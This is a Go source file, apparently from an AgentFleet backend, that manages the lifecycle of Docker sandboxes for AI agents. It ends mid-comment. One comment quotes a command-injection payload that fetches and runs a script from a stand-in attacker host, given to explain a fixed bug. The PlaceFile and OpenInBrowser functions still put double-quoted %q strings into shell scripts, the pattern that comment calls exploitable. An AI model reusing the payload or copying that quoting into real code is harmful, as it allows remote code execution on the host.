package fleet

import (
	"context"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"encoding/base64"
	"errors"
	"github.com/BryantVanOrden/AgentFleet/backend/internal/config"
	"github.com/BryantVanOrden/AgentFleet/backend/internal/store"
	"github.com/BryantVanOrden/AgentFleet/backend/pkg/protocol"
	"path/filepath"
)

// Manager owns the lifecycle of every sandbox on this host.
type Manager struct {
	cfg    *config.Config
	docker *DockerClient
	db     *store.Store
	log    *slog.Logger
	tiers  []protocol.TierProfile

	mu    sync.Mutex
	ports map[int]bool // host ports handed out when PublishPorts is on
}

func NewManager(cfg *config.Config, db *store.Store, log *slog.Logger) (*Manager, error) {
	dc, err := NewDockerClient(cfg.DockerHost)
	if err != nil {
		return nil, err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	if err := dc.Ping(ctx); err != nil {
		return nil, fmt.Errorf("docker unreachable at %s: %w", cfg.DockerHost, err)
	}
	if err := dc.EnsureNetwork(ctx, cfg.SandboxNetwork, false); err != nil {
		return nil, fmt.Errorf("sandbox network: %w", err)
	}
	return &Manager{
		cfg:    cfg,
		docker: dc,
		db:     db,
		log:    log,
		tiers:  DefaultTiers(cfg.SandboxImage),
		ports:  map[int]bool{},
	}, nil
}

func (m *Manager) Tiers() []protocol.TierProfile { return m.tiers }

// CreateRequest is what the API hands to the manager.
type CreateRequest struct {
	Name              string                     `json:"name"`
	ArchetypeID       string                     `json:"archetype_id,omitempty"`
	SystemPrompt      string                     `json:"system_prompt,omitempty"`
	PreinstalledTools []string                   `json:"preinstalled_tools,omitempty"`
	Tier              protocol.Tier              `json:"tier"`
	Override          *protocol.ResourceOverride `json:"override,omitempty"`
	Egress            protocol.EgressPolicy      `json:"egress"`
	ShellAccess       bool                       `json:"shell_access"`
	SudoAccess        bool                       `json:"sudo_access"`
	Labels            map[string]string          `json:"labels,omitempty"`
	// OrgID is the department the bot is created into. A bot can be shared
	// with more afterwards; creating into several at once is not a thing
	// anyone has asked to do.
	OrgID string `json:"org_id,omitempty"`
	// CustomTools are tools the operator added by hand, with how to fetch
	// them. The archetype catalogue cannot know about an internal CLI.
	CustomTools []protocol.CustomTool `json:"custom_tools,omitempty"`
	// Voice this bot speaks in. Empty takes the archetype's default.
	Voice   string `json:"voice,omitempty"`
	OwnerID string `json:"-"`
}

// Create provisions a sandbox and blocks until its agent daemon answers, so the
// caller never gets back an instance that cannot be driven.
func (m *Manager) Create(ctx context.Context, req CreateRequest) (*protocol.Instance, error) {
	// An archetype's tools come from its template unless the caller overrode
	// them. Repositories already worked this way; tools did not, so creating a
	// cyber_ops bot without spelling out a tool list got its wordlists and none
	// of its tooling — and the app has no reason to know the list.
	// Validated before anything is provisioned: these names and specs reach a
	// shell inside the sandbox, and refusing at the door beats sanitising deep
	// in a script.
	for _, c := range req.CustomTools {
		if err := c.Validate(); err != nil {
			// Wrapped so the API answers 400 rather than 500: a malformed tool
			// name is the caller's mistake, not the server's.
			return nil, fmt.Errorf("%w: %s", ErrInvalidRequest, err)
		}
	}

	if req.ArchetypeID != "" {
		if tmpl := protocol.BotTemplateByID(req.ArchetypeID); tmpl != nil {
			if len(req.PreinstalledTools) == 0 {
				req.PreinstalledTools = tmpl.PreinstalledTools
			}
			// A distinct voice per archetype, so a fleet is legible by ear.
			if req.Voice == "" {
				req.Voice = tmpl.DefaultVoice
			}
			// Shell where the archetype's whole job is a command line. Sudo is
			// never defaulted on — that is granted deliberately, per bot, by
			// someone who meant to.
			if !req.ShellAccess {
				req.ShellAccess = tmpl.DefaultShellAccess
			}
		}
	}

	live, err := m.db.CountLiveInstances(ctx)
	if err != nil {
		return nil, err
	}
	if live >= m.cfg.MaxInstances {
		return nil, fmt.Errorf("host is at capacity (%d/%d instances)", live, m.cfg.MaxInstances)
	}

	// An empty tier legitimately means "give me the default", but a tier that
	// was named and not recognised must not be quietly swapped for standard:
	// asking for developer-heavy and silently getting 2 vCPU is the kind of
	// substitution that is only noticed much later, by which point the agent
	// has been running on the wrong hardware.
	if req.Tier != "" && !HasTier(m.tiers, req.Tier) {
		return nil, fmt.Errorf("unknown tier %q; available: %s", req.Tier, TierNames(m.tiers))
	}
	profile := ApplyOverride(TierByName(m.tiers, req.Tier), req.Override)
	if profile.Driver == protocol.DriverQEMU {
		return nil, fmt.Errorf("the qemu driver is not wired up yet; see docs/ROADMAP.md phase 5")
	}

	id := store.NewID()
	name := req.Name
	if name == "" {
		name = "agent-" + id[:8]
	}

	// Fall back to the archetype's own persona.
	//
	// The templates each carry a specialised prompt written for the job, and
	// nothing ever read it -- so a bot created without an explicit personality
	// got an empty one and had nothing to say about what it was for. An
	// operator who writes their own still wins; this only fills a blank.
	persona := req.SystemPrompt
	if strings.TrimSpace(persona) == "" {
		if t := protocol.BotTemplateByID(req.ArchetypeID); t != nil {
			persona = t.SpecializedPrompt
		}
	}
	inst := &protocol.Instance{
		ID:                id,
		Name:              name,
		OwnerID:           req.OwnerID,
		OrgIDs:            orgIDsFor(req.OrgID),
		ArchetypeID:       req.ArchetypeID,
		SystemPrompt:      persona,
		PreinstalledTools: req.PreinstalledTools,
		Tier:              profile.Name,
		Driver:            profile.Driver,
		State:             protocol.InstanceProvisioning,
		Profile:           profile,
		Override:          req.Override,
		Egress:            req.Egress,
		Voice:             req.Voice,
		CustomTools:       req.CustomTools,
		ShellAccess:       req.ShellAccess && m.cfg.AllowShell,
		SudoAccess:        req.SudoAccess,
		Labels:            req.Labels,
		CreatedAt:         time.Now().UTC(),
		UpdatedAt:         time.Now().UTC(),
	}
	if err := m.db.CreateInstance(ctx, inst); err != nil {
		return nil, err
	}

	if err := m.boot(ctx, inst, profile); err != nil {
		inst.State = protocol.InstanceError
		inst.LastError = err.Error()
		_ = m.db.UpdateInstance(ctx, inst)
		return inst, err
	}
	return inst, nil
}

func (m *Manager) boot(ctx context.Context, inst *protocol.Instance, p protocol.TierProfile) error {
	// Reduce the tier to something this host will admit. DefaultTiers has always
	// said the profiles are advisory and that this happens; until now nothing
	// did it, so asking for more CPUs than the host has was a hard 400 from the
	// engine after the image had already been pulled. See clamp.go.
	//
	// The instance's stored profile is updated to match, so the fleet view shows
	// what the container actually got rather than what the tier asked for. A
	// panel reading "8 vCPU" over a container limited to 4 is the same species of
	// lie as a screen fronting a feature that does nothing.
	p = m.applyHostLimits(ctx, p)
	inst.Profile = p

	if !m.docker.ImageExists(ctx, p.Image) {
		m.log.Info("pulling sandbox image", "image", p.Image)
		if err := m.docker.PullImage(ctx, p.Image); err != nil {
			// Name the target that builds *this* image. The developer-heavy tier
			// uses a different tag and a different Dockerfile, so a blanket
			// "run make sandbox" sent whoever picked that tier to a command that
			// could not fix their problem.
			return fmt.Errorf("image %s unavailable: %w (build it with `%s`)",
				p.Image, err, buildTargetFor(p.Image))
		}
	}

	containerName := "af-" + inst.ID[:12]
	spec := containerCreate{
		Image:    p.Image,
		Hostname: sanitiseHostname(inst.Name),
		Labels: map[string]string{
			"managed-by":          "agentfleet",
			"agentfleet.instance": inst.ID,
			"agentfleet.tier":     string(p.Name),
		},
		Env: m.sandboxEnv(inst, p),
		ExposedPorts: map[string]struct{}{
			portKey(PortNoVNC):     {},
			portKey(PortNoVNCView): {},
			portKey(PortAgentd):    {},
		},
		HostConfig: hostConfig{
			Memory:      p.MemoryMB * 1024 * 1024,
			MemorySwap:  p.MemoryMB * 1024 * 1024, // no swap: OOM fails fast instead of thrashing
			NanoCPUs:    int64(p.VCPU * 1e9),
			ShmSize:     p.ShmMB * 1024 * 1024,
			PidsLimit:   ptr(int64(2048)),
			NetworkMode: m.cfg.SandboxNetwork,
			// SYS_ADMIN is deliberately absent. NET_ADMIN is only added when the
			// instance actually carries an egress policy to program.
			//
			// no-new-privileges is deliberately not set here; sudo is gated by
			// the setuid bit on /usr/bin/sudo instead, so it can be revoked
			// from a running agent without destroying its workspace. See
			// securityOpts in tiers.go for the trade that buys and costs.
			SecurityOpt:   securityOpts(inst.SudoAccess),
			RestartPolicy: restartPolicy{Name: "unless-stopped"},
			Ulimits:       []ulimit{{Name: "nofile", Soft: 8192, Hard: 16384}},
			Tmpfs:         map[string]string{"/tmp": "rw,exec,size=1g"},
		},
		NetworkingConfig: &networkingConfig{
			EndpointsConfig: map[string]endpointSettings{
				m.cfg.SandboxNetwork: {Aliases: []string{containerName}},
			},
		},
	}

	if hasEgressPolicy(inst.Egress) {
		spec.HostConfig.CapAdd = append(spec.HostConfig.CapAdd, "NET_ADMIN")
	}
	if p.DiskGB > 0 {
		// Only honoured on overlay2 + xfs with pquota; harmless elsewhere.
		spec.HostConfig.StorageOpt = map[string]string{"size": fmt.Sprintf("%dG", p.DiskGB)}
	}
	if p.GPU {
		spec.HostConfig.DeviceRequests = []deviceRequest{{
			Driver:       "nvidia",
			Count:        -1,
			Capabilities: [][]string{{"gpu", "compute", "utility", "graphics"}},
		}}
	}
	if m.cfg.PublishPorts {
		vnc, agentd := m.leasePort(), m.leasePort()
		spec.HostConfig.PortBindings = map[string][]portBind{
			portKey(PortNoVNC):  {{HostIP: "127.0.0.1", HostPort: strconv.Itoa(vnc)}},
			portKey(PortAgentd): {{HostIP: "127.0.0.1", HostPort: strconv.Itoa(agentd)}},
		}
	}

	cid, err := m.docker.CreateContainer(ctx, containerName, spec)
	if err != nil {
		// StorageOpt is rejected on most default setups; retry without the quota
		// rather than failing provisioning outright.
		if spec.HostConfig.StorageOpt != nil && strings.Contains(err.Error(), "storage-opt") {
			m.log.Warn("disk quota unsupported by storage driver, provisioning without it",
				"instance", inst.ID)
			spec.HostConfig.StorageOpt = nil
			cid, err = m.docker.CreateContainer(ctx, containerName, spec)
		}
		if err != nil {
			return fmt.Errorf("create container: %w", err)
		}
	}
	inst.Runtime = cid

	if err := m.docker.StartContainer(ctx, cid); err != nil {
		// A GPU that the host cannot actually provide fails here, not at create:
		// the nvidia prestart hook runs during container init, so the request is
		// accepted, the image is pulled, the container is made, and only then
		// does it fail with something like
		//
		//   nvidia-container-cli: initialization error: WSL environment detected
		//   but no adapters were found
		//
		// This cannot be predicted from /info. Docker Desktop registers the
		// nvidia runtime whether or not any adapter is present, so the runtime
		// list says yes and the hook says no. Starting the container is the only
		// authoritative test, which makes retrying without the GPU the honest
		// implementation rather than a workaround.
		//
		// The result is a working CPU sandbox instead of a dead instance, which
		// for developer-heavy is what the tier is on a machine with no GPU
		// anyway — its compilers do not need one.
		if len(spec.HostConfig.DeviceRequests) > 0 && isGPUUnavailable(err) {
			m.log.Warn("this host cannot provide a GPU; retrying without one",
				"instance", inst.ID, "err", err)
			_ = m.docker.RemoveContainer(ctx, cid)

			spec.HostConfig.DeviceRequests = nil
			inst.Profile.GPU = false
			inst.Labels = withLabel(inst.Labels, "gpu_unavailable", "true")

			cid, err = m.docker.CreateContainer(ctx, containerName, spec)
			if err != nil {
				return fmt.Errorf("create container without GPU: %w", err)
			}
			inst.Runtime = cid
			if err := m.docker.StartContainer(ctx, cid); err != nil {
				return fmt.Errorf("start container: %w", err)
			}
		} else {
			return fmt.Errorf("start container: %w", err)
		}
	}

	ci, err := m.docker.InspectContainer(ctx, cid)
	if err != nil {
		return err
	}
	// Still checked, because a container with no address on the sandbox
	// network is genuinely broken -- but the URLs are built from the alias.
	if ip := ci.IPOn(m.cfg.SandboxNetwork); ip == "" {
		return fmt.Errorf("container has no address on %s", m.cfg.SandboxNetwork)
	}
	inst.AgentdURL, inst.VNCURL, inst.VNCViewURL = urlsFor(inst)
	if m.cfg.PublishPorts {
		if hp := ci.HostPort(portKey(PortNoVNC)); hp != "" {
			inst.Labels = withLabel(inst.Labels, "published_vnc", "http://127.0.0.1:"+hp)
		}
	}

	if err := m.waitHealthy(ctx, inst.AgentdURL, 90*time.Second); err != nil {
		return fmt.Errorf("sandbox never became ready: %w", err)
	}

	// Apply the sudo decision now that the container is up. This is not
	// optional: the image ships sudo setuid, and no-new-privileges no longer
	// neutralises it (see securityOpts), so an instance created without this
	// would silently have root available. Failing to apply it is therefore a
	// provisioning failure, not a warning — an agent that quietly has more
	// privilege than it was granted is worse than one that failed to start.
	if err := m.SetSudo(ctx, inst, inst.SudoAccess); err != nil {
		return fmt.Errorf("could not apply the sudo setting: %w", err)
	}

	// Replace the archetype's wish list with what the sandbox actually has.
	//
	// The templates declare tools aspirationally — burpsuite, ghidra, blender —
	// and the system prompt tells the model it HAS whatever is on the list.
	// Measured against a running sandbox, 96 of 108 declared tools were absent,
	// so agents were being told to reach for commands that do not exist and
	// burning steps discovering it one at a time. Now the prompt only ever
	// names tools that answered.
	// Custom tools are verified alongside the archetype's, so an operator who
	// added one that could not be fetched is told by its absence rather than
	// by an agent failing to run it later.
	wanted := append(append([]string{}, inst.PreinstalledTools...), customToolNames(inst.CustomTools)...)
	inst.PreinstalledTools = m.verifyTools(ctx, inst, wanted)

	inst.State = protocol.InstanceRunning
	inst.LastError = ""
	return m.db.UpdateInstance(ctx, inst)
}

// shellQuote renders a string as a single POSIX shell word.
//
// Single quotes suppress every expansion bash performs, which double quotes do
// not: inside double quotes, command substitution still runs. The only
// character needing care is the single quote itself, closed and reopened
// around an escaped one.
func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// toolBinaries maps a tool name to the command it actually provides, where
// they differ.
var toolBinaries = map[string]string{
	"ripgrep": "rg", "postgresql-client": "psql", "nodejs": "node",
	"python3-pip": "pip3", "imagemagick": "convert", "build-essential": "gcc",
	"default-jdk": "javac", "docker.io": "docker", "aws-cli": "aws",
}

// verifyTools returns the subset of wanted tools the sandbox can actually run.
//
// One exec for the whole list rather than one per tool: this runs on the
// provisioning path, and a round trip per tool would add seconds to every
// machine for a list that is usually a dozen long.
func (m *Manager) verifyTools(ctx context.Context, inst *protocol.Instance, wanted []string) []string {
	if len(wanted) == 0 {
		return wanted
	}

	// Installation runs in the background so the desktop can come up promptly,
	// so wait for it to finish before deciding what the agent has. Bounded:
	// a slow mirror should delay the tool list, not the machine.
	m.waitForTools(ctx, inst, 4*time.Minute)

	var sb strings.Builder
	for _, t := range wanted {
		bin := t
		if mapped, ok := toolBinaries[t]; ok {
			bin = mapped
		}
		// Single-quoted, not %q. Go's %q produces a DOUBLE-quoted string, and
		// bash expands $(...) and backticks inside double quotes — so a tool
		// name of `$(curl attacker/x|sh)` was arbitrary command execution as
		// root in the sandbox, reachable by anyone who could create a bot.
		fmt.Fprintf(&sb, "command -v %s >/dev/null 2>&1 && echo %s\n",
			shellQuote(bin), shellQuote(t))
	}

	out, err := m.docker.ExecAs(ctx, inst.Runtime, "0", []string{"bash", "-lc", sb.String()})
	if err != nil {
		// A sandbox that cannot be probed keeps its declared list. Being
		// optimistic here is better than telling an agent it has nothing.
		return wanted
	}

	present := map[string]bool{}
	for _, line := range strings.Split(out, "\n") {
		if t := strings.TrimSpace(line); t != "" {
			present[t] = true
		}
	}
	verified := make([]string, 0, len(wanted))
	for _, t := range wanted {
		if present[t] {
			verified = append(verified, t)
		}
	}
	return verified
}

func (m *Manager) sandboxEnv(inst *protocol.Instance, p protocol.TierProfile) []string {
	env := []string{
		"AGENTFLEET_INSTANCE=" + inst.ID,
		"AGENTFLEET_TIER=" + string(p.Name),
		"DISPLAY=:1",
		"VNC_PORT=" + strconv.Itoa(PortNoVNC),
		"VNC_VIEW_PORT=" + strconv.Itoa(PortNoVNCView),
		"AGENTD_PORT=" + strconv.Itoa(PortAgentd),
		"ALLOW_SHELL=" + strconv.FormatBool(inst.ShellAccess),
		"SCREEN_RESOLUTION=" + envOr("SCREEN_RESOLUTION", "1920x1080x24"),
	}
	if inst.ArchetypeID != "" {
		env = append(env, "ARCHETYPE_ID="+inst.ArchetypeID)
	}
	if len(inst.PreinstalledTools) > 0 {
		env = append(env, "PREINSTALLED_TOOLS="+strings.Join(inst.PreinstalledTools, ","))
	}
	if len(inst.CustomTools) > 0 {
		// Same `tool=method:spec` shape the recipe file uses, so the sandbox
		// has one code path for both and an operator's addition behaves
		// exactly like a built-in one.
		recipes := make([]string, 0, len(inst.CustomTools))
		names := make([]string, 0, len(inst.CustomTools))
		for _, c := range inst.CustomTools {
			recipes = append(recipes, c.Name+"="+c.Method+":"+c.Spec)
			names = append(names, c.Name)
		}
		env = append(env, "CUSTOM_TOOL_RECIPES="+strings.Join(recipes, "\n"))
		env = append(env, "CUSTOM_TOOLS="+strings.Join(names, ","))
	}
	if tmpl := protocol.BotTemplateByID(inst.ArchetypeID); tmpl != nil {
		if len(tmpl.PreinstalledRepos) > 0 {
			env = append(env, "PREINSTALLED_REPOS="+strings.Join(tmpl.PreinstalledRepos, ","))
		}
		for k, v := range tmpl.DefaultEnvironment {
			env = append(env, k+"="+v)
		}
	}
	if hasEgressPolicy(inst.Egress) {
		env = append(env,
			"EGRESS_ALLOW="+strings.Join(inst.Egress.Allow, ","),
			"EGRESS_DENY="+strings.Join(inst.Egress.Deny, ","),
			"EGRESS_BLOCK_LOCAL="+strconv.FormatBool(inst.Egress.BlockLocal),
		)
	}
	return env
}

// waitHealthy polls the in-sandbox daemon until the desktop and control plane
// are both up.
func (m *Manager) waitHealthy(ctx context.Context, base string, limit time.Duration) error {
	deadline := time.Now().Add(limit)
	client := &http.Client{Timeout: 3 * time.Second}
	var lastErr error
	for time.Now().Before(deadline) {
		req, _ := http.NewRequestWithContext(ctx, http.MethodGet, base+"/health", nil)
		resp, err := client.Do(req)
		if err == nil {
			_ = resp.Body.Close()
			if resp.StatusCode == http.StatusOK {
				return nil
			}
			lastErr = fmt.Errorf("health returned %d", resp.StatusCode)
		} else {
			lastErr = err
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(time.Second):
		}
	}
	return lastErr
}

// ------------------------------------------------------------- lifecycle ----

func (m *Manager) Stop(ctx context.Context, id string) error {
	inst, err := m.db.Instance(ctx, id)
	if err != nil {
		return err
	}
	if inst.Runtime != "" {
		if err := m.docker.StopContainer(ctx, inst.Runtime, 15); err != nil {
			var de *DockerError
			if !asDockerError(err, &de) || !de.NotFound() {
				return err
			}
		}
	}
	return m.db.SetInstanceState(ctx, id, protocol.InstanceStopped, "")
}

func (m *Manager) Start(ctx context.Context, id string) error {
	inst, err := m.db.Instance(ctx, id)
	if err != nil {
		return err
	}
	if inst.Runtime == "" {
		return fmt.Errorf("instance has no container; delete and recreate it")
	}
	if err := m.docker.StartContainer(ctx, inst.Runtime); err != nil {
		// The container is gone, not merely stopped.
		//
		// A sandbox can disappear without the instance knowing: docker prune,
		// a host that cleans up on reboot, or an operator replacing the image
		// under a stopped agent. The instance kept pointing at a container id
		// that no longer exists, so every start returned a 404 with a docker
		// hash in it and there was no way back from the UI -- the agent was
		// bricked, permanently, by something that is supposed to be routine.
		// Everything needed to build it again is on the instance record.
		var de *DockerError
		if !errors.As(err, &de) || !de.NotFound() {
			return err
		}
		m.log.Info("sandbox container is gone; rebuilding it from the instance",
			"instance", inst.Name, "was", inst.Runtime)
		m.releasePortsFor(inst)
		if err := m.boot(ctx, inst, inst.Profile); err != nil {
			inst.State = protocol.InstanceError
			inst.LastError = err.Error()
			_ = m.db.UpdateInstance(ctx, inst)
			return err
		}
	}
	ci, err := m.docker.InspectContainer(ctx, inst.Runtime)
	if err != nil {
		return err
	}
	if ip := ci.IPOn(m.cfg.SandboxNetwork); ip != "" {
		inst.AgentdURL, inst.VNCURL, inst.VNCViewURL = urlsFor(inst)
	}
	if err := m.waitHealthy(ctx, inst.AgentdURL, 60*time.Second); err != nil {
		inst.State = protocol.InstanceError
		inst.LastError = err.Error()
		_ = m.db.UpdateInstance(ctx, inst)
		return err
	}
	inst.State = protocol.InstanceRunning
	inst.LastError = ""
	return m.db.UpdateInstance(ctx, inst)
}

// Pause freezes every process in the sandbox (SIGSTOP via the freezer cgroup).
// Used as the emergency brake from the mobile app.
func (m *Manager) Pause(ctx context.Context, id string) error {
	inst, err := m.db.Instance(ctx, id)
	if err != nil {
		return err
	}
	if err := m.docker.PauseContainer(ctx, inst.Runtime); err != nil {
		return err
	}
	return m.db.SetInstanceState(ctx, id, protocol.InstancePaused, "")
}

func (m *Manager) Resume(ctx context.Context, id string) error {
	inst, err := m.db.Instance(ctx, id)
	if err != nil {
		return err
	}
	if err := m.docker.UnpauseContainer(ctx, inst.Runtime); err != nil {
		return err
	}
	return m.db.SetInstanceState(ctx, id, protocol.InstanceRunning, "")
}

func (m *Manager) Delete(ctx context.Context, id string) error {
	inst, err := m.db.Instance(ctx, id)
	if err != nil {
		return err
	}
	if inst.Runtime != "" {
		if err := m.docker.RemoveContainer(ctx, inst.Runtime); err != nil {
			var de *DockerError
			if !asDockerError(err, &de) || !de.NotFound() {
				return err
			}
		}
	}
	m.releasePortsFor(inst)
	return m.db.DeleteInstance(ctx, id)
}

func (m *Manager) Stats(ctx context.Context, id string) (*protocol.InstanceStats, error) {
	inst, err := m.db.Instance(ctx, id)
	if err != nil {
		return nil, err
	}
	if inst.Runtime == "" || inst.State != protocol.InstanceRunning {
		return &protocol.InstanceStats{InstanceID: id, SampledAt: time.Now().UTC()}, nil
	}
	s, err := m.docker.Stats(ctx, inst.Runtime)
	if err != nil {
		return nil, err
	}
	out := &protocol.InstanceStats{
		InstanceID:  id,
		MemoryBytes: s.MemoryStats.Usage,
		MemoryLimit: s.MemoryStats.Limit,
		SampledAt:   time.Now().UTC(),
	}
	cpuDelta := float64(s.CPUStats.CPUUsage.TotalUsage - s.PreCPUStats.CPUUsage.TotalUsage)
	sysDelta := float64(s.CPUStats.SystemUsage - s.PreCPUStats.SystemUsage)
	if cpuDelta > 0 && sysDelta > 0 {
		cores := float64(s.CPUStats.OnlineCPUs)
		if cores == 0 {
			cores = 1
		}
		out.CPUPercent = (cpuDelta / sysDelta) * cores * 100
	}
	for _, n := range s.Networks {
		out.RxBytes += n.RxBytes
		out.TxBytes += n.TxBytes
	}
	return out, nil
}

// sandboxHost is how the rest of the system addresses a sandbox.
//
// The container's network alias, deliberately, not its IP. Docker hands out a
// new address every time a container starts, and the containers carry a
// restart policy -- so after a host reboot they come back on shuffled IPs
// without the orchestrator ever running the restart path that refreshes the
// stored URL. That left bots pointing at addresses nothing was listening on
// (a 500 on every desktop call) and, worse, at addresses another bot had
// since been given, so one bot's desktop showed another's screen. The alias
// is set on the endpoint at create time and resolves to whatever the current
// address is.
func sandboxHost(inst *protocol.Instance) string {
	return "af-" + inst.ID[:12]
}

// urlsFor builds the three sandbox URLs from the instance's stable hostname.
func urlsFor(inst *protocol.Instance) (agentd, vnc, vncView string) {
	h := sandboxHost(inst)
	return fmt.Sprintf("http://%s:%d", h, PortAgentd),
		fmt.Sprintf("http://%s:%d", h, PortNoVNC),
		fmt.Sprintf("http://%s:%d", h, PortNoVNCView)
}

// Reconcile aligns database state with what the engine actually reports. It runs
// on boot and on a timer so a crashed container does not stay "running" forever.
func (m *Manager) Reconcile(ctx context.Context) {
	instances, err := m.db.ListInstances(ctx)
	if err != nil {
		m.log.Error("reconcile: list instances", "err", err)
		return
	}
	for _, inst := range instances {
		if inst.Runtime == "" {
			continue
		}
		ci, err := m.docker.InspectContainer(ctx, inst.Runtime)
		if err != nil {
			var de *DockerError
			if asDockerError(err, &de) && de.NotFound() && inst.State != protocol.InstanceStopped {
				_ = m.db.SetInstanceState(ctx, inst.ID, protocol.InstanceError, "container disappeared")
			}
			continue
		}
		want := protocol.InstanceStopped
		switch {
		case ci.State.Paused:
			want = protocol.InstancePaused
		case ci.State.Running:
			want = protocol.InstanceRunning
		case ci.State.OOMKilled:
			want = protocol.InstanceError
		}
		if want != inst.State {
			msg := ""
			if want == protocol.InstanceError {
				msg = "container was OOM-killed; raise the tier memory limit"
			}
			m.log.Info("reconciling instance state", "instance", inst.ID, "from", inst.State, "to", want)
			_ = m.db.SetInstanceState(ctx, inst.ID, want, msg)
		}

		// Repair the address as well as the state.
		//
		// Reconcile used to sync only the lifecycle state, so a container that
		// came back on a different address -- which is what happens when the
		// host reboots and the restart policy, not the orchestrator, starts it
		// -- stayed marked running with a URL pointing at nothing. It looked
		// entirely healthy and 500'd on every call. Rows written before
		// sandboxes were addressed by name are healed here too.
		if ci.State.Running {
			agentd, vnc, vncView := urlsFor(&inst)
			if inst.AgentdURL != agentd || inst.VNCURL != vnc || inst.VNCViewURL != vncView {
				m.log.Info("reconciling sandbox address",
					"instance", inst.ID, "from", inst.AgentdURL, "to", agentd)
				updated := inst
				updated.AgentdURL, updated.VNCURL, updated.VNCViewURL = agentd, vnc, vncView
				if err := m.db.UpdateInstance(ctx, &updated); err != nil {
					m.log.Error("reconcile: could not save sandbox address",
						"instance", inst.ID, "err", err)
				}
			}
		}
	}
}

// WatchStats samples every running instance on an interval and publishes the
// results on the event bus.
func (m *Manager) WatchStats(ctx context.Context, every time.Duration, emit func(protocol.InstanceStats)) {
	t := time.NewTicker(every)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			list, err := m.db.ListInstances(ctx)
			if err != nil {
				continue
			}
			for _, inst := range list {
				if inst.State != protocol.InstanceRunning {
					continue
				}
				if s, err := m.Stats(ctx, inst.ID); err == nil {
					emit(*s)
				}
			}
		}
	}
}

// ExecInContainer is used by the recorder to fetch artefacts and by the admin
// panel's diagnostics view. It bypasses the agent daemon on purpose.
func (m *Manager) ExecInContainer(ctx context.Context, id string, cmd []string) (string, error) {
	inst, err := m.db.Instance(ctx, id)
	if err != nil {
		return "", err
	}
	return m.docker.Exec(ctx, inst.Runtime, cmd)
}

// PlaceFile writes a file inside an instance's sandbox.
//
// This is the orchestrator's own channel into the container, not the agent's:
// it works whether or not the bot is allowed to run shell commands, because it
// is not the bot running it. Used to put a copy of shared-catalog work on the
// desktop so an agent asked to test something can actually open it. The content
// travels as base64 so neither the document nor its path reaches a shell as
// syntax.
func (m *Manager) PlaceFile(ctx context.Context, instanceID, path string, content []byte) error {
	if !strings.HasPrefix(path, "/home/agent/") {
		return fmt.Errorf("refusing to write outside the agent home: %s", path)
	}
	script := fmt.Sprintf("mkdir -p %q && printf %%s %q | base64 -d > %q",
		filepath.Dir(path), base64.StdEncoding.EncodeToString(content), path)
	out, err := m.ExecInContainer(ctx, instanceID, []string{"sh", "-c", script})
	if err != nil {
		return fmt.Errorf("%w: %s", err, strings.TrimSpace(out))
	}
	return nil
}

// OpenInBrowser shows a URL on the instance's desktop, replacing the browser
// if it has stopped answering.
//
// A sandbox's Firefox is long-lived and can wedge -- "Firefox is already
// running, but is not responding" -- and when it does, everything an agent
// tries against it silently does nothing. Clicks land, typing accumulates in
// an address bar that never navigates, and the run reads as an agent that
// cannot work a browser rather than a browser that stopped working. Nothing
// the agent can do recovers this: bots here have no shell.
//
// Processes are matched by exact name. Matching the full command line would
// match the very shell running this, which then kills itself and never reaches
// the relaunch.
func (m *Manager) OpenInBrowser(ctx context.Context, instanceID, url string) error {
	if !strings.HasPrefix(url, "file:///home/agent/") {
		return fmt.Errorf("refusing to open %q", url)
	}
	script := fmt.Sprintf(`
set -u
url=%q
if timeout 10 runuser -u agent -- env DISPLAY=:1 x-www-browser --new-window "$url" >/dev/null 2>&1; then
  echo opened
  exit 0
fi
pkill -x firefox-bin >/dev/null 2>&1
pkill -x firefox >/dev/null 2>&1
sleep 3
pkill -9 -x firefox-bin >/dev/null 2>&1
sleep 1
# Do not restore what was there before. A browser is replaced because it had
# stopped working, and bringing its windows back puts a blank tab on top of the
# page the agent was meant to look at.
rm -rf /home/agent/.mozilla/firefox/*/sessionstore-backups >/dev/null 2>&1
rm -f /home/agent/.mozilla/firefox/*/sessionstore.jsonlz4 >/dev/null 2>&1
rm -f /home/agent/.mozilla/firefox/*/sessionstore.js >/dev/null 2>&1
setsid runuser -u agent -- env DISPLAY=:1 x-www-browser --new-window "$url" >/dev/null 2>&1 &
echo relaunched
`, url)
	out, err := m.ExecInContainer(ctx, instanceID, []string{"sh", "-c", script})
	if err != nil {
		return fmt.Errorf("%w: %s", err, strings.TrimSpace(out))
	}
	m.log.Info("showed work on the desktop",
		"instance", instanceID, "how", strings.TrimSpace(out))
	return nil
}

// ------------------------------------------------------------- port leases ---

func (m *Manager) leasePort() int {
	m.mu.Lock()
	defer m.mu.Unlock()
	for p := m.cfg.PortMin; p <= m.cfg.PortMax; p++ {
		if !m.ports[p] {
			m.ports[p] = true
			return p
		}
	}
	return 0 // let the engine pick
}

func (m *Manager) releasePortsFor(inst *protocol.Instance) {
	if inst.Labels == nil {
		return
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	for _, v := range inst.Labels {
		if i := strings.LastIndex(v, ":"); i >= 0 {
			if p, err := strconv.Atoi(v[i+1:]); err == nil {
				delete(m.ports, p)
			}
		}
	}
}

// ----------------------------------------------------------------- helpers ---

func portKey(p int) string { return strconv.Itoa(p) + "/tcp" }

func ptr[T any](v T) *T { return &v }

func hasEgressPolicy(e protocol.EgressPolicy) bool {
	return len(e.Allow) > 0 || len(e.Deny) > 0 || e.BlockLocal
}

func withLabel(m map[string]string, k, v string) map[string]string {
	if m == nil {
		m = map[string]string{}
	}
	m[k] = v
	return m
}

func sanitiseHostname(name string) string {
	var sb strings.Builder
	for _, r := range strings.ToLower(name) {
		switch {
		case r >= 'a' && r <= 'z', r >= '0' && r <= '9':
			sb.WriteRune(r)
		case r == '-' || r == ' ' || r == '_':
			sb.WriteRune('-')
		}
	}
	out := strings.Trim(sb.String(), "-")
	if out == "" {
		return "sandbox"
	}
	if len(out) > 60 {
		out = out[:60]
	}
	return out
}

func envOr(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

// SetSudo turns sudo on or off inside a running sandbox.
//
// It works by setting or clearing the setuid bit on the sudo binary, executed
